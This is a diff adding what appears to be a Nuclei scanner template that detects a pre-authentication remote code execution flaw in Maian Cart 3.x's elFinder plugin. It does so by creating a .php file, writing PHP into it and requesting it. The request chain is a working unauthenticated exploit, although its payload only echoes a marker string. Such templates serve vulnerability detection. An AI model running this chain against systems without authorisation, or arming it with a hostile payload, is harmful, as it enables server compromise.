@@ -1,0 +1,58 @@
+id: maian-cart-preauth-rce
+
+info:
+  name: Maian Cart 3.8 preauth RCE
+  author: pdteam
+  severity: critical
+  description: A severe vulnerability has been kindly reported to me by security advisor DreyAnd. The issue concerns the elFinder file manager plugin in Maian Cart and it affects all versions from 3.0 to 3.8.
+  reference: |
+      - https://dreyand.github.io/maian-cart-rce/
+      - https://github.com/DreyAnd/maian-cart-rce
+      - https://www.maianscriptworld.co.uk/critical-updates
+  tags: rce,unauth,maian
+
+requests:
+  - raw:
+      - |
+        GET /admin/index.php?p=ajax-ops&op=elfinder&cmd=mkfile&name={{randstr}}.php&target=l1_Lw HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+      - |
+        POST /admin/index.php?p=ajax-ops&op=elfinder HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: application/json, text/javascript, /; q=0.01
+        Connection: close
+        Accept-Language: en-US,en;q=0.5
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Pragma: no-cache
+        Cache-Control: no-cache
+        Content-Length: 97
+
+        cmd=put&target={{hash}}&content=%3c%3fphp%20echo%20%22{{randstr_1}}%22%3b%20%3f%3e
+
+      - |
+        GET /product-downloads/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    extractors:
+      - type: regex
+        name: hash
+        internal: true
+        group: 1
+        regex:
+          - '"hash"\:"(.*?)"\,'
+
+
+    req-condition: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body_3, "{{randstr_1}}")'
